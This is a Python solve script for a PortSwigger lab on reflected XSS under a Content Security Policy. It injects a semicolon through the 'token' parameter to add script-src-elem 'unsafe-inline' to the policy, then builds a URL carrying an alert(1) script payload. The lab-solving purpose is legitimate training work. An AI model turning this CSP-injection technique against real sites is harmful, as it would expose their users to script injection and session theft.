#!/usr/bin/env python3
"""
Solve script for PortSwigger Lab: Reflected XSS protected by CSP, with CSP bypass.

The `token` query parameter is reflected into the CSP's `report-uri` directive.
Injecting a semicolon ends that directive and appends a new one
(`script-src-elem 'unsafe-inline'`) which lets inline <script> tags execute.

Only works in Chrome.
"""

import argparse
from urllib.parse import quote
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "<script>alert(1)</script>"
TOKEN = ";script-src-elem 'unsafe-inline'"


def build_url(lab: str) -> str:
    return f"{lab}/?search={quote(PAYLOAD)}&token={quote(TOKEN)}"


def main():
    parser = argparse.ArgumentParser(description="Solve XSS Lab 29: CSP bypass via report-uri injection")
    parser.add_argument("lab_url", help="Lab URL, e.g. https://0aXX00...web-security-academy.net")
    args = parser.parse_args()

    lab = args.lab_url.rstrip("/")
    url = build_url(lab)
    print(f"[+] Exploit URL (open in Chrome):\n    {url}")

    s = requests.Session()
    s.verify = False

    r = s.get(url)
    csp = r.headers.get("Content-Security-Policy", "")
    print(f"[*] CSP header on response:\n    {csp}")
    if "script-src-elem 'unsafe-inline'" in csp:
        print("[+] Injection succeeded — CSP now contains script-src-elem 'unsafe-inline'")
    else:
        print("[-] Injection NOT reflected into CSP header — lab may have changed")

    r = s.get(lab)
    if "Congratulations" in r.text or "is-solved" in r.text:
        print("[+] Lab solved!")
    else:
        print("[*] Open the exploit URL in Chrome to trigger alert(1) and solve the lab.")


if __name__ == "__main__":
    main()
